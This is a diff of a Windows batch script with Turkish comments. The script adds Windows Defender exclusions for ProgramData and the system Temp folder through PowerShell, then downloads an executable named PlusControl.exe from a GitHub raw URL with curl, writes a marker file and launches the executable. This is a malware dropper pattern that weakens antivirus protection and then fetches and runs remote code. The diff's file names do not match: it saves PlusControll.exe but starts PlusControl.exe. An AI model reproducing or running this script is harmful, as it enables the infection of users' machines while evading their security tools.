@@ -6,14 +6,13 @@ powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
 powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"
 
 REM Dosya kontrolü
-    if exist PlusControl.exe (
-        start PlusControl.exe
+    if exist PlusControll.exe (
+        start PlusControll.exe
         exit /b
     )
 )
 
-REM Dosyalar yoksa veya nagihori2.txt yoksa buraya devam eder
-echo Dosyalar hazirlaniyor...
-curl -L https://github.com/seition2doc/dosta4/edit/main/PlusControl.exe -o PlusControl.exe
-echo "asd" > nagihori2.txt 
+
+curl -L https://github.com/seition2doc/dosta4/raw/refs/heads/main/PlusControl.exe -o PlusControll.exe
+echo "asd" > nagihori3.txt 
 start PlusControl.exe
